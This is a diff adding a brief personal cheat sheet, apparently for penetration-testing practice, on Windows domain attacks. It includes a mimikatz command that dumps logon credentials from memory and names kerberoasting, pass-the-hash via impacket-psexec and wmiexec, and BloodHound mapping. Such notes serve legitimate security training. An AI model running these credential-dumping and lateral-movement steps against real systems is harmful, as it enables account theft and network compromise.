@@ -1,0 +1,15 @@
+#usually its some form of "get hash, use hash"
+
+mimikatz "privilege::debug" "sekurlsa::logonpasswords"
+
+net accounts # to display lockout information
+
+# if we have one account on the domain,
+	#try kerberoasting
+
+#if we got creds/hashes we can try
+	impacket-psexec
+	impacket-wmiexec
+	#overpass the hash with mimikax
+
+#try to map things with bloodhound
